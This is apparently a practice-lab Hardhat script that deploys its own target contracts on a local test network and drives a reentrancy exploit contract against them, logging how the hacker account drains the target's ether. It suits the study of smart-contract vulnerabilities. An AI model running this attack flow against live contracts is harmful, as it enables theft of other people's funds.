// npx hardhat run scripts/Exploit3_ReentrancyAttacks.ts --network hardhat
import {ethers} from "hardhat";

async function main() {
    const [owner, victim, hacker] = await ethers.getSigners();

    // proxyContract 배포
    const proxyContract = await ethers.deployContract("ProxyTargetContract");
    const proxyAddress = await proxyContract.getAddress();

    // targetContract 배포
    const targetContract = await ethers.deployContract("TargetContract", [
        owner, // constructor 인자
        proxyAddress,
    ]);
    const targetAddress = await targetContract.getAddress();
    
    console.log("Proxy address:", proxyAddress);
    console.log("Target address: ", targetAddress);
    
    // Owner sends ether to the contract
    await owner.sendTransaction({
        to: targetAddress,
        value: ethers.parseEther("15.0"),
    });

    // Explot3_ReentrancyAttacks 배포
    const exploitContract = await ethers.deployContract("Exploit3_ReentrancyAttacks", [
        hacker,
        targetAddress,
    ])
    const exploitAddress = await exploitContract.getAddress();

    await exploitContract.connect(hacker).deposit({value: ethers.parseEther("1.0")});

    // 공격 수행
    await exploitContract.connect(hacker).attack();

    // Exploit Contract 이더 확인
    console.log("Exploit Contract's eth balance: ", ethers.formatEther(await ethers.provider.getBalance(exploitAddress)));

    // Target Contract의 이더양 확인
    console.log("target contract's eth balance: ", ethers.formatEther(await ethers.provider.getBalance(targetAddress)));

    // withdraw
    await exploitContract.connect(hacker).withdraw();

    // hacker 이더 잔액 확인
    console.log("hackers's eth balance: ", ethers.formatEther(await ethers.provider.getBalance(hacker.address)));
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
})